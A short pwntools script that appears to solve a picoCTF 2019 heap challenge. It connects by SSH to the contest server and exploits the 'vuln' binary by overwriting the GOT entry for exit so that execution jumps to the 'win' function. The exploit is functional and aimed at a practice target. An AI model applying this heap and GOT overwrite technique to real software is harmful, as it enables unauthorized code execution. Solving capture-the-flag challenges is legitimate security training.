#!/usr/bin/env python3
from pwn import *
import os

context(arch='x86', terminal=['tmux', 'neww'])
s = ssh(host='2019shell1.picoctf.com',
        user='afcidk',
        password=os.environ['PASS'],
        port=22)
s.set_working_directory(
    b'/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215')

e = ELF('./vuln')
r = s.process(['./vuln', 'a' * 6])

r.recvuntil('decimal.')
r.recvline()
addr = int(r.recvline().split()[0])
shellcode = asm(f'push {e.symbols["win"]}; ret;')
r.sendline(p32(addr + 0x10) + p32(e.got['exit'] - 8) + b'aaaaaaaa' + shellcode)
r.interactive()
